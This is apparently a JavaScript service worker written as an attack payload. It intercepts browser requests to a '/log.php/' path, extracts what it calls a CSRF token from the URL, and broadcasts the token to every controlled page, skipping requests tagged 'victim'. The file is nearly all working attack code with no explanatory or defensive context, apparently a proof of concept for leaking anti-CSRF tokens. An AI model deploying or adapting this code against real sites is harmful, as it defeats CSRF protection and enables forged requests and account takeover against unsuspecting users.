console.log("load sw.js");

self.addEventListener('activate', function(event) {
console.log('Claiming control');
return self.clients.claim();
});

self.addEventListener('fetch', function(event) {
    console.log("fetch");
    var urlLogged = event.request.url;
    console.log(urlLogged);
    if (urlLogged.indexOf("/log.php/") >=0  && urlLogged.indexOf("victim") == -1){
        var splitted = urlLogged.split("/log.php/");
        var csrfToken = splitted[splitted.length - 1];
        console.log(csrfToken);
        self.clients.matchAll().then(all => all.map(client => client.postMessage(csrfToken)));
    }
});
